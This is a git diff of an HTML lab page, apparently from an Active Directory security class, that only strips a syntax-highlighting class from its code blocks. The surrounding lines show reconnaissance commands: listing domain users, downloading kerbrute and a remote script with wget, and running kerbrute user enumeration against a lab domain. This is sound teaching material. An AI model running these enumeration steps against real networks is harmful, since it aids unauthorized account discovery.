@@ -32,7 +32,7 @@
                         <button class="close">X</button>
                     </div>
                 </div>
-                <pre class="language-powershell">   
+                <pre>   
 net user /domain
                 </pre>
                 <button class="copy-btn" onclick="copyToClipboard()">Copy</button>
@@ -53,7 +53,7 @@ net user /domain
                         <button class="close">X</button>
                     </div>
                 </div>
-                <pre class="language-powershell">   
+                <pre>   
 
 # Get a list of all users in the domain (replace with local if needed)
 $users = (net user /domain) -split '\r?\n' | Where-Object { $_ -match '^\S' -and $_ -notmatch '^User accounts for' -and $_ -notmatch '^-+' -and $_ -notmatch "The command completed successfully" }
@@ -120,7 +120,7 @@ foreach ($user in $users) {
                         <button class="close">X</button>
                     </div>
                 </div>
-                <pre class="language-powershell">   
+                <pre>   
 
 dsquery user -limit 0 | dsget user -dn | ForEach-Object { ($_ -split ',')[0] -replace 'CN=', '' }
 
@@ -143,7 +143,7 @@ dsquery user -limit 0 | dsget user -dn | ForEach-Object { ($_ -split ',')[0] -re
                         <button class="close">X</button>
                     </div>
                 </div>
-                <pre class="language-powershell">   
+                <pre>   
 Get-ADUser -Filter * -Properties SamAccountName | Select-Object SamAccountName
 
                 </pre>
@@ -165,7 +165,7 @@ Get-ADUser -Filter * -Properties SamAccountName | Select-Object SamAccountName
                         <button class="close">X</button>
                     </div>
                 </div>
-                <pre class="language-powershell">   
+                <pre>   
 # Import the Active Directory module if not already imported
 Import-Module ActiveDirectory
 
@@ -204,7 +204,7 @@ foreach ($user in $users) {
                         <button class="close">X</button>
                     </div>
                 </div>
-                <pre class="language-powershell">   
+                <pre>   
 
 mkdir C:\temp
 cd C:\temp
@@ -227,7 +227,7 @@ wget https://raw.githubusercontent.com/overgrowncarrot1/maraudersec-classes/refs
                         <button class="close">X</button>
                     </div>
                 </div>
-                <pre class="language-powershell">
+                <pre>
 wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe -o kerbrute.exe
      
                 </pre>
@@ -247,7 +247,7 @@ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_window
                         <button class="close">X</button>
                     </div>
                 </div>
-                <pre class="language-powershell">
+                <pre>
 
 .\kerbrute.exe userenum .\usernames.txt -d maraudersec.local
                     
@@ -270,7 +270,7 @@ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_window
                         <button class="close">X</button>
                     </div>
                 </div>
-                <pre class="language-powershell">
+                <pre>
         
 # Function to check if a username is valid in the given domain
 function Check-ValidUser {
@@ -354,7 +354,7 @@ Invoke-UserEnum -domain $domain -usernameListPath $usernameListPath
                         <button class="close">X</button>
                     </div>
                 </div>
-                <pre class="language-powershell">
+                <pre>
 
 # Function to check if a username is valid in the given domain
 function Check-ValidUser {
